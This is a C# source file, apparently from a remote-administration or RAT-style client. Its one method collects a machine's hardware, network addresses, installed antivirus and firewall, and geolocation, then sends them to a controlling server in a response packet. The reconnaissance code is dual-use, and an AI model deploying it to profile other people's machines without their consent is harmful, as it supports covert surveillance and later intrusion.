using System;
using System.IO;
using System.Net.NetworkInformation;
using static Client.Controllers.Tools.AuthenticationController;

namespace Client.Controllers
{
    public static class SystemInformationController
    {
        public static void getSysInfo(ClientMosaic client)
        {
            try
            {
                IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();

                var domainName = (!string.IsNullOrEmpty(properties.DomainName)) ? properties.DomainName : "-";
                var hostName = (!string.IsNullOrEmpty(properties.HostName)) ? properties.HostName : "-";

                string[] infoCollection = new string[]
                {
                    "Processor (CPU)",
                    getCpuName(),
                    "Memory (RAM)",
                    string.Format("{0} MB", getTotalRamAmount()),
                    "Video Card (GPU)",
                    getGpuName(),
                    "PC Name",
                    getName(),
                    "Domain Name",
                    domainName,
                    "Host Name",
                    hostName,
                    "System Drive",
                    Path.GetPathRoot(Environment.SystemDirectory),
                    "System Directory",
                    Environment.SystemDirectory,
                    "Uptime",
                    getUptime(),
                    "MAC Address",
                    getMacAddress(),
                    "LAN IP Address",
                    getLanIp(),
                    "WAN IP Address",
                    GeoInfo.Ip,
                    "Antivirus",
                    getAntivirus(),
                    "Firewall",
                    GetFirewall(),
                    "Time Zone",
                    GeoInfo.Timezone,
                    "Country",
                    GeoInfo.Country,
                    "ISP",
                    GeoInfo.Isp
                };
                new Packets.ClientPackets.GetSysInfoResponse(infoCollection).Execute(client);
            }
            catch
            {
            }
        }
    }
}
